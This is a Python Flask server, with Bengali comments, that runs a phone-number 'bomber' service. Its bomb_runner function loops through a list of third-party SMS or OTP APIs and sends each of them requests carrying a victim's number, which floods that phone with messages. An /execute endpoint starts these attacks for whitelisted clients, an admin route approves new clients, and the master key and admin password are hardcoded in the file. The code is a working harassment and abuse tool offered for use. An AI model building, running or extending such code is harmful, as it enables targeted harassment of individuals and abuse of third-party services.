import json, requests, time, os, threading
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

ADMIN_CONFIG = {
    "master_key": "Prime_xyron_9xm",
    "admin_pass": "PRIME_XYRON_LOG",
    "whitelist_file": "whitelist.json",
    "requests_file": "requests.json"
}

def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump([], f)
        return []
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return []

def save_db(file, data):
    with open(file, 'w') as f: json.dump(data, f)

# --- Real-Time Bomber Engine ---
def bomb_runner(target, count):
    try:
        with open('apis.json', 'r') as f:
            data = json.load(f)
            api_pool = data.get('apis', [])
    except Exception as e:
        print(f"Error: {e}")
        return

    # নাম্বার ফরম্যাট ঠিক করা (019... -> 19...) অনেক এপিআই-এর জন্য লাগে
    target_no_zero = target[1:] if target.startswith('0') else target

    for _ in range(count):
        for api in api_pool:
            try:
                # ***** অথবা {phone} থাকলে রিপ্লেস করা
                url = api['url'].replace("*****", target).replace("{phone}", target)
                method = api.get('method', 'GET').upper()
                headers = api.get('headers', {})
                body = api.get('body', "")

                if body:
                    body = body.replace("*****", target).replace("{phone}", target)

                if method == "POST":
                    requests.post(url, data=body, headers=headers, timeout=5)
                else:
                    requests.get(url, headers=headers, timeout=5)
                
                time.sleep(0.3) # সার্ভার ওভারলোড এড়াতে সামান্য বিরতি
            except:
                continue

# --- Routes ---
@app.route('/')
def home():
    return {"status": "online", "owner": "Prime Xyron"}

@app.route('/admin')
def admin_page():
    return render_template('admin.html')

@app.route('/api/v1/status')
def get_status():
    return jsonify({"pending": load_db(ADMIN_CONFIG["requests_file"]), "approved": load_db(ADMIN_CONFIG["whitelist_file"])})

@app.route('/api/v1/execute', methods=['GET'])
def execute():
    client_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    user_key = request.args.get('key')
    
    whitelist = load_db(ADMIN_CONFIG["whitelist_file"])
    
    if user_key != ADMIN_CONFIG["master_key"] or client_ip not in whitelist:
        pending = load_db(ADMIN_CONFIG["requests_file"])
        if not any(r['ip'] == client_ip for r in pending):
            pending.append({"ip": client_ip, "ua": request.headers.get('User-Agent', 'Unknown'), "time": time.strftime("%H:%M:%S")})
            save_db(ADMIN_CONFIG["requests_file"], pending)
        return jsonify({"code": 401, "msg": "APPROVAL_REQUIRED", "ip": client_ip}), 401

    target = request.args.get('target')
    count = request.args.get('count', type=int)

    if target and count:
        threading.Thread(target=bomb_runner, args=(target, count)).start()
        return jsonify({"code": 200, "status": "ATTACK_STARTED", "target": target})
    
    return jsonify({"code": 400, "msg": "INVALID_PARAMS"}), 400

@app.route('/api/v1/control', methods=['POST'])
def control():
    data = request.json
    if data.get('auth') != ADMIN_CONFIG["admin_pass"]: return jsonify({"msg": "WRONG_PASS"}), 401
    
    action, val = data.get('action'), data.get('value')
    whitelist, pending = load_db(ADMIN_CONFIG["whitelist_file"]), load_db(ADMIN_CONFIG["requests_file"])

    if action == "approve":
        if val not in whitelist: whitelist.append(val)
        pending = [r for r in pending if r['ip'] != val]
    elif action == "remove":
        whitelist = [i for i in whitelist if i != val]
    
    save_db(ADMIN_CONFIG["whitelist_file"], whitelist); save_db(ADMIN_CONFIG["requests_file"], pending)
    return jsonify({"msg": "UPDATED"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
